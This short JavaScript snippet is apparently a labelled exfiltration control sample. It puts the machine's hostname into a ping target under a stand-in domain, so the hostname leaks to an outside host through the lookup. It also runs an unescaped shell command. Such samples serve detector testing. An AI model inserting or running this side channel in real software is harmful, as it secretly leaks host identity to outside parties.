// Host-identity ICMP exfil control: the hostname is composed into the
// ping target, forming a real side channel.
const os = require('os');
const { execSync } = require('child_process');
const h = os.hostname();
execSync(`ping -c 1 ${h}.example.net`);
